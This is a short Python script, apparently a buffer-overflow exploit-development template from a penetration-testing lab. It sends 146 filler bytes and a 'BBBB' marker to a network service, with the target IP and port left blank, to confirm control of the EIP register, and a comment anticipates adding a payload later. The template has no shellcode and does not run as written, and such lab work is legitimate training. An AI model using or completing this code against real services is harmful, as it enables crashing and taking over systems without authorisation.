#!/usr/bin/env python3

import socket, time, sys
from time import sleep

ip = ""

port =      	          # Integer
timeout = 5               # Integer
return_value = "\r\n"     # Does the server take input that requires enter for input? Send empty if not required
offset = 146
EIP = "BBBB"			  # B's used to identify EIP, should show as 42424242 in EIP register

prefix = ""
string = "A" * offset

try:
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((ip, port))
      s.settimeout(timeout) # Helpful for stopping when overflow occurs
      print("Fuzzing with {} bytes".format(len(string)) + "and EIP as %s" % EIP)
      s.send(bytes(prefix, "latin1") + bytes(string, "latin1") + bytes(EIP, "latin1") + bytes(return_value, "latin1")) # Send the string as bytes rather than characters. Helpful later when adding a payload
      s.recv(1024) 
      s.close()
except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
